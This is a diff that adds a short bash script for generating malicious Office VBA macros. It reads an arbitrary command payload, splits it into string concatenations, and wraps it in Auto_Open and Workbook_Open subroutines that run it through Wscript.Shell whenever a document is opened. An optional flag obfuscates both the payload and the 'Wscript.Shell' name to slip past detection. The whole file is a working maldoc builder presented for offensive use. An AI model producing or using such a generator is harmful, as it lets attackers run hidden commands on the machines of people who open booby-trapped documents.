@@ -1,0 +1,58 @@
+#!/bin/bash
+
+shopt -s lastpipe
+
+obfuscate=false
+read -r PAYLOAD
+
+function usage() {
+  echo "$(basename $0) [-x]"
+  exit 1
+}
+
+while getopts "hx" o; do
+  case "${o}" in
+    x)
+      obfuscate=true
+      ;;
+    h | *)
+      usage
+      ;;
+  esac
+done
+shift $((OPTIND-1))
+
+
+function generate_vba_payload() {
+  if [ "$obfuscate" = true ]; then
+    PAYLOAD=$(echo -n "$PAYLOAD" | fold -w 1 | tr '\n' '_')
+  fi
+  echo "$PAYLOAD" | fold -w 70 | sed 's/.*/    Str = Str + \"&\"/'
+}
+
+function call_payload() {
+  if [ "$obfuscate" = true ]; then
+    echo '    CreateObject(Replace("W_s_c_r_i_p_t_._S_h_e_l_l", "_", "")).Run Replace(Str, "_", "")'
+  else
+    echo '    CreateObject("Wscript.Shell").Run Str'
+  fi
+}
+
+cat <<EOF
+Sub Auto_Open()
+    MaCrow
+End Sub
+
+Sub Workbook_Open()
+    MaCrow
+End Sub
+
+Sub MaCrow()
+    Dim Str As String
+    Str = ""
+
+$(generate_vba_payload)
+
+$(call_payload)
+End Sub
+EOF
